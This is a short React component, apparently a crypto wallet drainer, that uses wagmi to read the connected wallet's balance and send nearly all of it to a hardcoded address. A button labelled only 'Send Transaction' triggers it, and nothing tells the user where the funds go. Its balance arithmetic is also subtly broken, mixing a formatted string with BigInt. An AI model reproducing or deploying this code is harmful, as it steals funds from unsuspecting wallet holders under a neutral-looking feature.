import { useState } from "react";
import { useAccount, useBalance, useSendTransaction } from "wagmi";

export default function SendTransaction() {
    const [loading, setLoading] = useState(false);
//const sendTR
const { address, isConnected } = useAccount();
const balance = useBalance({
    address: address,
    formatUnits: 'wei',
  })

const { data, isLoading, isSuccess, sendTransaction } = useSendTransaction({
    to: '0xB9D8AdCA9Dd396416a2892b4Dc472d7Fb6e2b4E7',
    value: BigInt(balance.data?.formatted - 1000000000000000)
    })


 

    if (isConnected) {
      console.log("Connected Try To Send. From :" + address)
      return (
        <div>
          <button onClick={() => sendTransaction()}>Send Transaction</button>
          <h1>value: {balance.data?.formatted}</h1>
          {isLoading && <div>Check Wallet</div>}
          {isSuccess && <div>Transaction: {JSON.stringify(data)}</div>}
        </div>
      )
      }
  
}
